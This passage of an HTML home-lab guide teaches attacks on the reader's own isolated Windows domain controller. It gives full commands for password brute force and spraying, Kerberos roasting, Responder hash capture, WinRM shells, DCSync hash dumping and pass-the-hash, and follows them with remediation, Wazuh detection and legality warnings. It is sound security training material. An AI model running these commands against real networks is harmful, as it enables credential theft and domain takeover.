+<p>Brute force = <strong>many passwords, one account</strong>. <code>Hydra</code> is the classic tool.
+The built-in <code>administrator</code> account is a great target because it always exists.</p>
+<pre>hydra -l administrator -P lab-passwords.txt smb://10.0.0.10</pre>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">hydra</td><td>An online password-guessing tool. &ldquo;Online&rdquo; means it actually logs in over the network, one guess at a time.</td></tr>
+  <tr><td class="mono">-l administrator</td><td>Lowercase <strong>l</strong> = one login name to attack.</td></tr>
+  <tr><td class="mono">-P lab-passwords.txt</td><td>Capital <strong>P</strong> = a file of passwords to try, in order. (Remember: <code>-l</code> single login, <code>-L</code> list of logins; <code>-p</code> single password, <code>-P</code> list.)</td></tr>
+  <tr><td class="mono">smb://10.0.0.10</td><td>The protocol and target. Hydra speaks many protocols; we are using SMB (Windows file sharing / login).</td></tr>
+</table>
+<p class="tcap">The exact same job with <code>netexec</code>, which is friendlier and prints the found password clearly:</p>
+<pre>netexec smb 10.0.0.10 -u administrator -p lab-passwords.txt --continue-on-success</pre>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">-u administrator</td><td>The username.</td></tr>
+  <tr><td class="mono">-p lab-passwords.txt</td><td>Here <code>-p</code> accepts a <em>file</em>: netexec tries each line as a password.</td></tr>
+  <tr><td class="mono">--continue-on-success</td><td>Keep trying even after finding one that works (by default it stops at the first hit). Handy for spraying, dangerous with lockouts.</td></tr>
+</table>
+<div class="box b-warn">
+  <span class="bt">If the account is set to lock out</span>
+  <p>Stop before you reach the threshold. With a 5-password lockout, send only <strong>1</strong>
+  guess per account per 30&nbsp;minutes, across many accounts &mdash; that is spraying, next.</p>
+</div>
+
+<h2>4.4 Password spraying (the professional's brute force)</h2>
+<p>Spraying flips brute force on its head: <strong>one password, many accounts</strong>. It never
+trips a per-account lockout because each account only sees one guess. First, a user list:</p>
+<pre>cat &gt; users.txt &lt;&lt;'EOF'
+administrator
+labadmin
+guest
+svc-backup
+EOF</pre>
+<p>Now the spray itself:</p>
+<pre>netexec smb 10.0.0.10 -u users.txt -p 'Winter2026!' --continue-on-success
+netexec smb 10.0.0.10 -u users.txt -p 'Corp@2026'   --continue-on-success</pre>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">-u users.txt</td><td>Capital-style: <code>-u</code> accepts a <strong>file of usernames</strong> here, so it tries every user in the list.</td></tr>
+  <tr><td class="mono">-p 'Winter2026!'</td><td>Just <strong>one</strong> password against all of them. Then you repeat with the next password. That is the &ldquo;low and slow&rdquo; pattern.</td></tr>
+</table>
+
+<h2>4.5 Kerberos attacks &mdash; the AD-native way</h2>
+<p>Kerberos is the domain's authentication protocol, and it is full of documented weaknesses that
+need <em>no password</em> if you find the right account. Two classics:</p>
+
+<h3>a) Enumerate valid usernames</h3>
+<pre>kerbrute userenum --dc 10.0.0.10 -d corp.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt</pre>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">kerbrute userenum</td><td>A tool that asks Kerberos about usernames. Kerberos replies differently for real vs fake users, so you learn which names exist without any password.</td></tr>
+  <tr><td class="mono">--dc 10.0.0.10</td><td>The domain controller to ask.</td></tr>
+  <tr><td class="mono">-d corp.local</td><td>The domain name.</td></tr>
+  <tr><td class="mono">&hellip;usernames.txt</td><td>The wordlist of candidate names to test. Install the lists with <code>sudo apt install seclists</code> if missing.</td></tr>
+</table>
+
+<h3>b) AS-REP roasting &mdash; steal a crackable hash with no login at all</h3>
+<p>If an account is flagged &ldquo;do not require Kerberos pre-authentication,&rdquo; you can ask the
+DC for a blob encrypted with that user's password and crack it offline. On your lab:</p>
+<pre>impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 10.0.0.10 -format hashcat -outputfile asrep.txt
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt</pre>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">impacket-GetNPUsers</td><td>The Impacket tool that performs the AS-REP roast &mdash; it asks the DC for a ticket for each user and saves the crackable ones.</td></tr>
+  <tr><td class="mono">corp.local/</td><td>The domain, with no username after the slash &mdash; we are not authenticating.</td></tr>
+  <tr><td class="mono">-usersfile users.txt</td><td>Try these usernames.</td></tr>
+  <tr><td class="mono">-no-pass</td><td>Do not attempt a login (the whole point &mdash; this works without credentials).</td></tr>
+  <tr><td class="mono">-dc-ip 10.0.0.10</td><td>Where the domain controller is.</td></tr>
+  <tr><td class="mono">-format hashcat</td><td>Write the hashes in the format <code>hashcat</code> expects.</td></tr>
+  <tr><td class="mono">-outputfile asrep.txt</td><td>Save the results here.</td></tr>
+</table>
+<h4>Anatomy: <span class="mono">hashcat</span></h4>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">hashcat</td><td>The fastest hash-cracking tool. It guesses passwords, hashes them, and compares &mdash; offline, so no lockouts and no network.</td></tr>
+  <tr><td class="mono">-m 18200</td><td>The <strong>hash type</strong>. <code>18200</code> = AS-REP. Using the wrong number just fails loudly.</td></tr>
+  <tr><td class="mono">asrep.txt</td><td>The file of hashes to crack.</td></tr>
+  <tr><td class="mono">rockyou.txt</td><td>The wordlist of guesses.</td></tr>
+</table>
+<p class="tcap"><code>-m 18200</code> is the AS-REP hash type. (We checked <code>administrator</code> on your DC: it is <em>not</em> roastable &mdash; a good setting. The lesson is to look for accounts that are.)</p>
+
+<h3>c) Kerberoasting &mdash; crack a service account (needs any one valid login)</h3>
+<p>Every service with a registered SPN can have a ticket requested by <em>any</em> authenticated user.
+That ticket is encrypted with the service account's password hash and can be cracked offline.</p>
+<pre>impacket-GetUserSPNs corp.local/USER:PASS -dc-ip 10.0.0.10 -request -outputfile kerb.txt
+hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt</pre>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">impacket-GetUserSPNs</td><td>Lists &ldquo;service principal names&rdquo; (accounts tied to services) and, with <code>-request</code>, pulls their tickets.</td></tr>
+  <tr><td class="mono">corp.local/USER:PASS</td><td>Your <em>valid</em> low-privilege login &mdash; any normal user works here.</td></tr>
+  <tr><td class="mono">-request</td><td>Actually request the crackable service tickets (not just list).</td></tr>
+  <tr><td class="mono">-m 13100</td><td>hashcat's <strong>Kerberoast</strong> ticket type.</td></tr>
+</table>
+
+<h2>4.6 Steal a hash with no attack at all: LLMNR/NBT-NS poisoning</h2>
+<p>This is often the <em>first</em> thing that works on a real network, and it needs no usernames at
+all. Windows machines constantly shout &ldquo;who is <em>TheServer</em>?&rdquo; across the network
+using old name-resolution protocols (LLMNR, NBT-NS, mDNS). If you answer <em>everyone</em>, the victim
+sends you its login hash, which you then crack offline.</p>
+<pre>sudo responder -I eth0 -dwv</pre>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">responder</td><td>A tool that listens on the network and <em>answers</em> those name shouts with &ldquo;that's me!&rdquo;, capturing whatever credentials get sent.</td></tr>
+  <tr><td class="mono">-I eth0</td><td>Listen on this network card (<code>eth0</code> = your <code>intnet</code> card at 10.0.0.30).</td></tr>
+  <tr><td class="mono">-d</td><td>Answer DHCP queries too.</td></tr>
+  <tr><td class="mono">-w</td><td>Run the WPAD rogue-proxy (catches proxy auto-discovery attempts).</td></tr>
+  <tr><td class="mono">-v</td><td>Verbose &mdash; show what it captured as it happens.</td></tr>
+</table>
+<div class="box b-warn">
+  <span class="bt">Responder attacks everyone on the segment &mdash; lab only</span>
+  <p>This is the tool that must <strong>never</strong> run outside your isolated network. It will try
+  to capture credentials from every machine it can reach. On your lab, start it, then do something on
+  the server that triggers a name lookup (open a share, map a drive, or simply browse
+  <code>\\does-not-exist</code> at the server's console). Captured hashes appear under
+  <code>~/.responder/logs/</code> or <code>/usr/share/responder/logs/</code>.</p>
+</div>
+<pre>hashcat -m 5600 ~/.responder/logs/SMB-NTLMv2-SSP-*.txt /usr/share/wordlists/rockyou.txt</pre>
+<p class="tcap">The <code>*</code> is a wildcard meaning &ldquo;any file matching this pattern.&rdquo; <code>-m 5600</code> = NetNTLMv2, the hash type Responder captures.</p>
+
+<table class="d wrap">
+  <tr><th style="width:14%" class="c">hashcat mode</th><th style="width:30%">Hash type</th><th>Where it comes from</th></tr>
+  <tr><td class="mono c">5600</td><td>NetNTLMv2</td><td>Responder / network capture</td></tr>
+  <tr><td class="mono c">18200</td><td>AS-REP</td><td><code>GetNPUsers</code></td></tr>
+  <tr><td class="mono c">13100</td><td>Kerberoast (TGS)</td><td><code>GetUserSPNs</code></td></tr>
+  <tr><td class="mono c">1000</td><td>NTLM (Windows hash)</td><td>Offline dump of SAM / NTDS</td></tr>
+</table>
+
+<!-- ==================== PART 5 ==================== -->
+<h1 class="sec">5 &nbsp;Turning a password into a shell</h1>
+
+<p class="lead">A cracked password is only the door key. This part walks through it and proves you
+are now on the machine.</p>
+
+<h2>5.1 Remote shell over WinRM (port 5985)</h2>
+<p>WinRM is Windows' built-in remote PowerShell. If it is open &mdash; it is here &mdash; and you
+have admin credentials, you get a shell.</p>
+<pre>netexec winrm 10.0.0.10 -u administrator -p 'THE_PASSWORD' -x whoami</pre>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">netexec winrm</td><td>Same hammer, but speaking WinRM instead of SMB.</td></tr>
+  <tr><td class="mono">-u / -p</td><td>The working credentials you found.</td></tr>
+  <tr><td class="mono">-x whoami</td><td><strong>e</strong>Xecute this single command on the remote machine. <code>whoami</code> prints which account you are running as &mdash; proof you are in.</td></tr>
+</table>
+<pre>evil-winrm -i 10.0.0.10 -u administrator -p 'THE_PASSWORD'</pre>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">evil-winrm</td><td>A tool that gives you an interactive remote PowerShell session (a real shell you can type into). Install with <code>sudo apt install evil-winrm</code>.</td></tr>
+  <tr><td class="mono">-i 10.0.0.10</td><td>Target IP (<code>i</code> = ip/address).</td></tr>
+  <tr><td class="mono">-u / -p</td><td>Username and password.</td></tr>
+</table>
+<pre><span class="cmt"># Inside the session &mdash; the first three commands any intruder types:</span>
+whoami
+hostname
+net user                     <span class="cmt"># list local accounts</span></pre>
+
+<h2>5.2 SMB with credentials: shares and files</h2>
+<pre>smbclient -L //10.0.0.10 -U 'corp.local\administrator%THE_PASSWORD'
+smbclient //10.0.0.10/SYSVOL -U 'corp.local\administrator%THE_PASSWORD'</pre>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">-U 'user%pass'</td><td><strong>U</strong>ser &mdash; supply a username, a <code>%</code>, then the password, all in one argument. The backslash and quotes handle the <code>DOMAIN\user</code> format.</td></tr>
+  <tr><td class="mono">//10.0.0.10/SYSVOL</td><td>The share to enter. On a DC, <code>SYSVOL</code> and <code>NETLOGON</code> are shared to everyone and often hold logon scripts and old passwords.</td></tr>
+</table>
+<p class="tcap"><code>netexec smb &hellip; --shares</code> lists shares and <code>--spider</code> walks the tree for you.</p>
+
+<h2>5.3 LDAP with credentials: dump the whole directory</h2>
+<pre>ldapsearch -x -H ldap://10.0.0.10 -D 'administrator@corp.local' -w 'THE_PASSWORD' -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName memberOf</pre>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">-D 'administrator@corp.local'</td><td><strong>D</strong>istinguished name to <em>bind</em> (log in) as &mdash; the account querying the directory.</td></tr>
+  <tr><td class="mono">-w 'THE_PASSWORD'</td><td>The password for that bind. (Use <code>-W</code> instead to be prompted, safer than putting it in your history.)</td></tr>
+  <tr><td class="mono">sAMAccountName memberOf</td><td>Print two attributes per user: the login name and the groups it belongs to &mdash; so you can spot Domain Admins.</td></tr>
+</table>
+
+<h2>5.4 RDP</h2>
+<p>On your lab net port 3389 is closed, so this will fail &mdash; and that is a lesson. If it were
+open: <code>xfreerdp /v:10.0.0.10 /u:administrator /p:'THE_PASSWORD'</code> (<code>/v</code> =
+host, <code>/u</code> = user, <code>/p</code> = password). We note the failure and move on; a good
+tester does not force a closed door.</p>
+
+<!-- ==================== PART 6 ==================== -->
+<h1 class="sec">6 &nbsp;Post-exploitation &mdash; showing impact, then stopping</h1>
+
+<p class="lead">Once you are a Domain Admin, the honest demonstration of &ldquo;how bad is this?&rdquo;
+takes exactly one command. Then you stop. The goal is to prove the risk, not to ruin your own lab.</p>
+
+<h2>6.1 The proof: DCSync</h2>
+<p>A domain controller replicates password hashes between DCs using a special right. If you hold
+Domain Admin, you can ask the DC to &ldquo;replicate&rdquo; and it will hand you any account's hash
+&mdash; including <code>krbtgt</code> (the master key of the whole domain). This is <strong>DCSync</strong>.</p>
+<pre>impacket-secretsdump 'corp.local/administrator:THE_PASSWORD@10.0.0.10' -just-dc-ntlm</pre>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">impacket-secretsdump</td><td>Dumps secret material: local account hashes from SAM, or &mdash; with the right to replicate &mdash; the whole domain.</td></tr>
+  <tr><td class="mono">'corp.local/administrator:THE_PASSWORD@10.0.0.10'</td><td>All the login details in one string: <code>domain/user:password@host</code>.</td></tr>
+  <tr><td class="mono">-just-dc-ntlm</td><td>Only dump the domain NT hashes (skip the rest). This is the &ldquo;game over&rdquo; output.</td></tr>
+</table>
+<div class="box b-bad">
+  <span class="bt">This is the ceiling. Do not go past it in your lab.</span>
+  <p>With the <code>krbtgt</code> hash an attacker can forge Golden Tickets that grant access for
+  years. That is real, career-changing damage. In your lab, note the finding, screenshot it, and put
+  the VM back to its snapshot. Understanding the ceiling is the point &mdash; living there is not.</p>
+</div>
+
+<h2>6.2 Pass-the-Hash</h2>
+<p>You do not always need the plaintext. Windows accepts the NT hash directly. If you dumped a hash,
+you can log in without ever cracking it:</p>
+<pre>netexec smb 10.0.0.10 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:NT_HASH_HERE'</pre>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">-H &lt;hash&gt;</td><td><strong>H</strong>ash instead of a password. Windows lets you authenticate with the hash value itself. The part before the colon is the (usually empty) LM hash; the part after is the NT hash.</td></tr>
+</table>
+
+<h2>6.3 A single clean impact demo: add and use a test user</h2>
+<p>For the writeup, the tidiest demonstration is a throwaway account &mdash; exactly what Volume&nbsp;2
+monitored for. Do it once so you can see it in Wazuh, then remove it.</p>
+<pre>net user pentest-user 'Str0ng-Lab-Pass!' /add
+net localgroup Administrators pentest-user /add
+net localgroup Administrators pentest-user /delete
+net user pentest-user /delete</pre>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">net user NAME 'PASS' /add</td><td>Create a local account with that password.</td></tr>
+  <tr><td class="mono">net localgroup Administrators NAME /add</td><td>Add it to the local Administrators group (the privilege you are demonstrating).</td></tr>
+  <tr><td class="mono">&hellip; /delete</td><td>Remove it from the group and delete the account &mdash; clean up after yourself.</td></tr>
+</table>
+<p class="tcap">Between adding and deleting, check Wazuh: event <code>4720</code> (account created) and <code>4732</code> (added to a group) should have fired.</p>
+
+<!-- ==================== PART 7 ==================== -->
+<h1 class="sec">7 &nbsp;Remediation &mdash; fix everything you just broke</h1>
+
+<p class="lead">This is why the whole exercise exists. For each attack above, here is the fix. This is
+the blue-team half, and it is the half that gets paid. Apply these, then re-run the attack and watch
+it fail.</p>
+
+<table class="d wrap">
+  <tr><th style="width:26%">Attack you used</th><th style="width:37%">How to fix it</th><th>How to detect it in Wazuh</th></tr>
+  <tr>
+    <td><strong>Brute force / spray</strong> (4.3&ndash;4.4)</td>
+    <td>Strong password policy and, crucially, a lockout:<br>
+      <code>net accounts /minpwlen:14 /lockoutthreshold:5 /lockoutduration:15 /lockoutobservation:30</code><br>
+      Enforce MFA. Use <em>fine-grained password policies</em> so admin accounts differ from users.</td>
+    <td>Event <code>4625</code> (failed logon) and <code>4771</code>/<code>4768</code> (Kerberos fail). Alert when one source produces &gt;5 failures in a short window; <code>4740</code> = an account locked out.</td>
+  </tr>
+  <tr>
+    <td><strong>AS-REP roasting</strong> (4.5b)</td>
+    <td>Require Kerberos pre-authentication on <em>every</em> account (the default; audit for exceptions):
+      <code>Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}</code></td>
+    <td><code>4768</code> for accounts that should not be requested without pre-auth.</td>
+  </tr>
+  <tr>
+    <td><strong>Kerberoasting</strong> (4.5c)</td>
+    <td>Use <strong>gMSA</strong> (group managed service accounts) with 120-char random passwords, or set service account passwords to 25+ random characters. Remove unneeded SPNs. Disable RC4 (use AES only).</td>
+    <td><code>4769</code> (service ticket requested) with RC4 encryption type is the classic signal.</td>
+  </tr>
+  <tr>
+    <td><strong>LLMNR / NBT-NS poisoning</strong> (4.6)</td>
+    <td>Disable the protocols you are not using, by GPO: turn off LLMNR (multicast) and NetBIOS over TCP/IP on all adapters. This removes the conversation an attacker can hijack.</td>
+    <td>Unusual name-resolution and SMB authentication from an unexpected host.</td>
+  </tr>
+  <tr>
+    <td><strong>Weak admin password in general</strong></td>
+    <td>Use <strong>Windows LAPS</strong> so every machine's local admin password is unique and rotated. Put privileged accounts in the <strong>Protected Users</strong> group.</td>
+    <td>New local-admin activity, <code>4672</code> (special privileges assigned).</td>
+  </tr>
+  <tr>
+    <td><strong>WinRM as an easy shell</strong> (5.1)</td>
+    <td>Only expose 5985 to management hosts; prefer HTTPS on 5986; disable WinRM where unused. Firewall to <code>10.0.0.0/24</code> and to admin workstations only.</td>
+    <td>Service creation and remote-PowerShell activity; <code>4688</code> with process command line.</td>
+  </tr>
+  <tr>
+    <td><strong>DCSync / Pass-the-Hash</strong> (6.1&ndash;6.2)</td>
+    <td>Least privilege: almost nobody should be Domain Admin. Adopt a tiered admin model; protect <code>krbtgt</code>; enable Credential Guard and LSA protection (<code>RunAsPPL</code>). Rotate <code>krbtgt</code> twice if ever exposed.</td>
+    <td><code>4662</code> referencing the replication GUIDs <code>1131f6aa-&hellip;</code> / <code>1131f6ad-&hellip;</code> = someone is reading hashes. High severity.</td>
+  </tr>
+  <tr>
+    <td><strong>Old, unpatched OS</strong> (build 20348.587)</td>
+    <td>Patch. Your DC is at an early-2022 revision. Enable Windows Update / WSUS and stay current.</td>
+    <td>Vulnerability scanner results in Wazuh's own vulnerability module.</td>
+  </tr>
+</table>
+
+<h2>7.1 Settings your server already gets right (keep them)</h2>
+<div class="box b-ok">
+  <span class="bt">Credit where due</span>
+  <ul>
+    <li><strong>SMB signing required</strong> &mdash; blocks relay attacks. Do not turn this off.</li>
+    <li><strong>SMBv1 disabled</strong> &mdash; no EternalBlue-class worm surface.</li>
+    <li><strong>Anonymous LDAP search denied</strong> &mdash; users are not freely readable.</li>
+    <li><strong>RDP closed on the lab interface</strong> &mdash; one fewer door.</li>
+  </ul>
+  <p style="margin-top:2mm">Your Volume&nbsp;2 hardening is visibly working. The remaining gaps are
+  mostly about <em>credentials and name resolution</em>, which is exactly where an attacker aims.</p>
+</div>
+
+<h2>7.2 The single biggest win</h2>
+<p>If you do one thing after reading this: put a <strong>lockout policy plus lengthy passwords</strong>
+on the domain, and <strong>disable LLMNR/NetBIOS</strong>. Those two moves defeat the two attacks that
+would most likely succeed against this lab.</p>
+
+<!-- ==================== PART 8 ==================== -->
+<h1 class="sec">8 &nbsp;Cheat sheet, glossary &amp; writeup</h1>
+
+<h2>8.1 Command cheat sheet</h2>
+<table class="d wrap">
+  <tr><th style="width:34%">Goal</th><th>Command</th></tr>
+  <tr><td>Find hosts</td><td class="mono">sudo nmap -sn 10.0.0.0/24</td></tr>
+  <tr><td>Full port scan</td><td class="mono">sudo nmap -Pn -sS -p- --min-rate 2000 -T4 10.0.0.10</td></tr>
+  <tr><td>Service versions</td><td class="mono">sudo nmap -Pn -sV -sC -p 445,88,389,5985 10.0.0.10</td></tr>
+  <tr><td>SMB snapshot</td><td class="mono">netexec smb 10.0.0.10</td></tr>
+  <tr><td>List shares (anon)</td><td class="mono">smbclient -L //10.0.0.10 -N</td></tr>
+  <tr><td>LDAP root / domain</td><td class="mono">ldapsearch -x -H ldap://10.0.0.10 -s base -b "" namingContexts</td></tr>
+  <tr><td>Brute force SMB</td><td class="mono">netexec smb 10.0.0.10 -u administrator -p lab-passwords.txt</td></tr>
+  <tr><td>Spray</td><td class="mono">netexec smb 10.0.0.10 -u users.txt -p 'Winter2026!' --continue-on-success</td></tr>
+  <tr><td>AS-REP roast</td><td class="mono">impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 10.0.0.10</td></tr>
+  <tr><td>Kerberoast</td><td class="mono">impacket-GetUserSPNs corp.local/u:p -dc-ip 10.0.0.10 -request</td></tr>
+  <tr><td>Poison names</td><td class="mono">sudo responder -I eth0 -dwv</td></tr>
+  <tr><td>Crack NetNTLMv2</td><td class="mono">hashcat -m 5600 hashes.txt rockyou.txt</td></tr>
+  <tr><td>WinRM shell</td><td class="mono">evil-winrm -i 10.0.0.10 -u administrator -p PASS</td></tr>
+  <tr><td>Dump domain hashes</td><td class="mono">impacket-secretsdump corp.local/administrator:PASS@10.0.0.10 -just-dc-ntlm</td></tr>
+</table>
+
+<h2>8.2 How to read any tool's help</h2>
+<p>Every tool in this guide has a built-in manual. If a flag confuses you, ask the tool directly:</p>
+<pre>nmap -h                 <span class="cmt"># short help</span>
+man nmap                <span class="cmt"># full manual (press q to quit)</span>
+netexec smb -h          <span class="cmt"># help for one module</span>
+hashcat --help | less   <span class="cmt"># full hashcat help, scrollable</span></pre>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">-h</td><td>&ldquo;Help.&rdquo; Almost every tool prints its options.</td></tr>
+  <tr><td class="mono">man TOOL</td><td>The full manual page. <kbd>q</kbd> quits, <kbd>/</kbd> searches.</td></tr>
+  <tr><td class="mono">| less</td><td>The pipe <code>|</code> sends the output into <code>less</code>, a scrollable viewer, so long help does not scroll past you.</td></tr>
+</table>
+
+<h2>8.3 Glossary</h2>
+<table class="d wrap">
+  <tr><th style="width:22%">Term</th><th>Plain meaning</th></tr>
+  <tr><td><strong>Domain Controller (DC)</strong></td><td>The server that controls logins for the whole Windows domain. The prize.</td></tr>
+  <tr><td><strong>SMB</strong></td><td>Windows file-sharing protocol. Port 445. Also carries logins.</td></tr>
+  <tr><td><strong>Kerberos</strong></td><td>The domain's ticket-based login system. Port 88.</td></tr>
+  <tr><td><strong>LDAP</strong></td><td>How Windows publishes its list of users/groups. Ports 389/636.</td></tr>
+  <tr><td><strong>Hash</strong></td><td>A scrambled fingerprint of a password. Crackable offline, at speed.</td></tr>
+  <tr><td><strong>Wordlist</strong></td><td>A text file of guessed passwords, one per line.</td></tr>
+  <tr><td><strong>Brute force</strong></td><td>Many passwords, one account.</td></tr>
+  <tr><td><strong>Spray</strong></td><td>One password, many accounts. Lockout-safe.</td></tr>
+  <tr><td><strong>Roasting</strong></td><td>Abusing Kerberos to obtain a crackable hash (AS-REP or Kerberoast).</td></tr>
+  <tr><td><strong>Responder</strong></td><td>Answers wrong network name lookups to capture login hashes.</td></tr>
+  <tr><td><strong>DCSync</strong></td><td>Making a DC hand over password hashes by pretending to be another DC.</td></tr>
+  <tr><td><strong>Pass-the-Hash</strong></td><td>Logging in with a password's hash instead of the plaintext.</td></tr>
+</table>
+
+<h2>8.4 Your writeup skeleton</h2>
+<pre><span class="cmt"># Red-Team Exercise &mdash; WinServer (corp.local)</span>
+Scope:        WinServer 10.0.0.10, attacked from Kali 10.0.0.30, isolated intnet.  Snapshot taken: yes.
+Authorization: I own this VM and network.
+
+1. Recon            &mdash; nmap sweep + full port scan. Found DC: 88/389/445/5985 open.
+2. Enumeration      &mdash; domain corp.local, host SERVER, SMB signing required, anon LDAP denied.
+3. Credential attack&mdash; &lt;which method worked?&gt;  e.g. sprayed Winter2026! against 4 users; administrator accepted.
+4. Access           &mdash; WinRM shell as administrator.
+5. Impact           &mdash; secretsdump returned domain hashes (DCSync).
+6. Detection        &mdash; Wazuh alerts seen: 4625 xN, 4624, 4769, 4662. Which fired, which did not?
+7. Remediation      &mdash; applied lockout policy + disabled LLMNR; re-ran step 3, now blocked.
+8. Lessons          &mdash; 3 sentences on what surprised me.</pre>
+
+<div class="box b-info">
+  <span class="bt">Turn this into a job</span>
+  <p>A GitHub repo with both this red-team writeup <em>and</em> the Volume&nbsp;2 hardening writeup,
+  side by side, is exactly what a junior security analyst portfolio looks like. Attack it, detect it,
+  fix it, document it. That loop <em>is</em> the job.</p>
+</div>
+
+<!-- ==================== APPENDIX A ==================== -->
+<h1 class="sec">Appendix A &nbsp;Findings table for your report</h1>
+
+<p class="lead">Copy this into your writeup, fill in the last column as you go, and you have a real
+findings document.</p>
+
+<table class="d wrap">
+  <tr><th class="c" style="width:8%">#</th><th style="width:30%">Finding</th><th class="c" style="width:12%">Severity</th><th>Fix</th><th class="c" style="width:12%">Exploitable?</th></tr>
+  <tr><td class="c">1</td><td>Weak / guessable account passwords</td><td class="c"><span class="tag t-crit">High</span></td><td>Length 14+, complexity, lockout, MFA</td><td class="c">&nbsp;</td></tr>
+  <tr><td class="c">2</td><td>No account lockout (if threshold 0)</td><td class="c"><span class="tag t-crit">High</span></td><td><code>net accounts /lockoutthreshold:5</code></td><td class="c">&nbsp;</td></tr>
+  <tr><td class="c">3</td><td>LLMNR / NetBIOS enabled</td><td class="c"><span class="tag t-hi">Med</span></td><td>Disable via GPO</td><td class="c">&nbsp;</td></tr>
+  <tr><td class="c">4</td><td>Kerberoastable / AS-REP-roastable accounts</td><td class="c"><span class="tag t-hi">Med</span></td><td>gMSA / require pre-auth / AES-only</td><td class="c">&nbsp;</td></tr>
+  <tr><td class="c">5</td><td>WinRM 5985 exposed widely</td><td class="c"><span class="tag t-md">Med</span></td><td>Restrict / HTTPS / disable</td><td class="c">&nbsp;</td></tr>
+  <tr><td class="c">6</td><td>Unpatched build 20348.587</td><td class="c"><span class="tag t-md">Med</span></td><td>Patch via Windows Update</td><td class="c">&nbsp;</td></tr>
+  <tr><td class="c">7</td><td>Built-in <code>administrator</code> in active use</td><td class="c"><span class="tag t-md">Med</span></td><td>Named admin + LAPS + Protected Users</td><td class="c">&nbsp;</td></tr>
+  <tr><td class="c">8</td><td>SMB signing required</td><td class="c"><span class="tag t-ok">Good</span></td><td>Keep</td><td class="c">No</td></tr>
+  <tr><td class="c">9</td><td>SMBv1 disabled</td><td class="c"><span class="tag t-ok">Good</span></td><td>Keep</td><td class="c">No</td></tr>
+  <tr><td class="c">10</td><td>Anonymous LDAP search denied</td><td class="c"><span class="tag t-ok">Good</span></td><td>Keep</td><td class="c">No</td></tr>
+</table>
+
+<div class="box b-warn">
+  <span class="bt">Final reminder</span>
+  <p>Everything here is legal <em>only</em> because you own <code>10.0.0.10</code> and the network is
+  isolated. The moment you point any of these tools at a system you do not have written permission to
+  test, it stops being education and becomes a crime. Keep it on the lab bench, keep the snapshots,
+  and keep learning.</p>
+</div>
+
+</div>
+</body>
+</html>
